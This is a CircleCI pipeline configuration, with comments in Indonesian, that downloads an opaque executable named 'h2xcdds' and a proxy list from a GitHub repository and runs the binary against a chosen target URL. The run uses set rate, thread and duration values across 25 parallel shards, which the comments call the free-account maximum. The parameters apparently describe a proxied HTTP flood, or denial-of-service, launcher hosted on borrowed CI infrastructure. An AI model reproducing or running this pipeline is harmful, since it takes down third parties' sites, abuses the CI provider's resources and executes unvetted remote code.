version: 2.1

# Parameter yang bisa diatur saat trigger manual (via API atau UI)
parameters:
  url:
    type: string
    default: ""
    description: "Target URL"
  rate:
    type: integer
    default: 10
    description: "Rate"
  time:
    type: integer
    default: 60
    description: "Duration (seconds)"
  threads:
    type: integer
    default: 4
    description: "Number of threads"

jobs:
  run:
    machine:
      image: ubuntu-2204:current
    # ===== UBAH DI SINI: Maksimal shard untuk akun gratis CircleCI = 25 =====
    parallelism: 25
    steps:
      - checkout  # Optional, jika butuh file repo, tapi di sini tidak dipakai

      - run:
          name: Install Python 3.12
          command: |
            sudo apt update
            sudo apt install -y python3.12

      - run:
          name: Download h2xcdds and proxy.txt
          command: |
            wget https://github.com/rizkindriani2/uuYHG/raw/refs/heads/main/h2xcdds
            wget https://github.com/rizkindriani2/uuYHG/raw/refs/heads/main/proxy.txt

      - run:
          name: Make executable
          command: chmod +x h2xcdds

      - run:
          name: Run h2xcdds with timeout
          command: |
            TIME=<< pipeline.parameters.time >>
            timeout $TIME ./h2xcdds \
              "<< pipeline.parameters.url >>" \
              "$((TIME + 60))" \
              "<< pipeline.parameters.rate >>" \
              "<< pipeline.parameters.threads >>" \
              proxy.txt \
              --raw \
              --path

# Workflow utama (wajib ada)
workflows:
  run-h2xcdds:
    jobs:
      - run
